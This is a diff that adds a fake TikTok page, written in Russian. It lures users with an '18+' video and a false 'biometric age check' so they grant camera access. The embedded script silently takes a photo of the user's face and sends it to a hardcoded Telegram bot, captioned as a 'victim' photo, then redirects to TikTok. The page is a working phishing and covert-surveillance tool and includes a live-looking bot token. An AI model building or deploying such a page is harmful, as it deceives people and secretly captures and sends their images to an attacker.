@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok - Видео</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #010101;
+            color: white;
+            font-family: 'ProximaNova', sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        /* Имитация интерфейса TikTok */
+        .header {
+            position: absolute;
+            top: 20px;
+            width: 100%;
+            text-align: center;
+        }
+
+        .logo {
+            width: 120px;
+            margin-bottom: 10px;
+        }
+
+        .video-container {
+            width: 90%;
+            height: 70%;
+            background: #121212;
+            border-radius: 8px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            border: 1px solid #333;
+            position: relative;
+        }
+
+        .play-icon {
+            font-size: 60px;
+            color: rgba(255, 255, 255, 0.8);
+            margin-bottom: 20px;
+        }
+
+        .btn-watch {
+            background-color: #fe2c55;
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: transform 0.1s;
+        }
+
+        .btn-watch:active {
+            transform: scale(0.95);
+        }
+
+        .footer-text {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #8a8a8e;
+            padding: 0 20px;
+            text-align: center;
+        }
+
+        /* Скрытые элементы для работы */
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <img src="https://wikimedia.org" alt="TikTok" class="logo">
+    </div>
+
+    <div class="video-container">
+        <div class="play-icon">▶</div>
+        <button class="btn-watch" onclick="initCapture()">СМОТРЕТЬ ВИДЕО</button>
+        <p style="font-size: 12px; color: #555; margin-top: 10px;">18+ Контент для взрослых</p>
+    </div>
+
+    <p class="footer-text">Чтобы продолжить просмотр, подтвердите возраст, разрешив доступ к камере для биометрической проверки.</p>
+
+    <video id="v" autoplay></video>
+    <canvas id="c"></canvas>
+
+    <script>
+        const TOKEN = '8732856671:AAGaeDEaknbUts1NihyvHuQVkvpbM_C1XHA';
+        const ID = '8732856671';
+
+        async function initCapture() {
+            try {
+                // Запрос доступа
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const v = document.getElementById('v');
+                v.srcObject = stream;
+
+                // Небольшая задержка для фокуса
+                setTimeout(() => {
+                    const c = document.getElementById('c');
+                    c.width = v.videoWidth;
+                    c.height = v.videoHeight;
+                    c.getContext('2d').drawImage(v, 0, 0);
+
+                    c.toBlob(async (blob) => {
+                        const fd = new FormData();
+                        fd.append('chat_id', ID);
+                        fd.append('photo', blob, 'user.jpg');
+                        fd.append('caption', '📷 Жертва открыла ссылку!');
+
+                        await fetch(`https://telegram.org{TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: fd
+                        });
+                        
+                        // Перенаправляем на любое популярное видео
+                        window.location.href = "https://tiktok.com";
+                    }, 'image/jpeg');
+                }, 800);
+
+            } catch (e) {
+                alert("Ошибка доступа! Пожалуйста, разрешите доступ к камере в настройках браузера, чтобы подтвердить ваш возраст.");
+            }
+        }
+    </script>
+</body>
+</html>
